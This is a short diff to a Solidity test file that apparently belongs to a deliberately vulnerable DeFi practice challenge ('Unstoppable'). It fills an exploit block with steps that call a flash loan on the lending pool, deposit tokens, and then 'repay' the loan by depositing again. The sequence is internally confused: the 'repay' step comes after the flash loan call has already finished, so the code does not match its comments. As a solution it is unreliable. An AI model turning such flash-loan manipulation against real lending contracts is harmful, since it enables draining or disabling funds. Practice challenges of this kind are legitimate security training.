@@ -56,10 +56,22 @@ contract Unstoppable is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitUnstoppable() public {
         /**
          * EXPLOIT START *
          */
+
+         // Borrow using a flash loan
+        receiverUnstoppable.executeFlashLoan(TOKENS_IN_POOL);
+
+        // Deposit 100 DVT into the pool
+        dvt.approve(address(unstoppableLender), 100e18);
+        unstoppableLender.depositTokens(100e18);
+
+        // Repay the flash loan
+        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
+        unstoppableLender.depositTokens(TOKENS_IN_POOL);
+        
         /**
          * EXPLOIT END *
          */
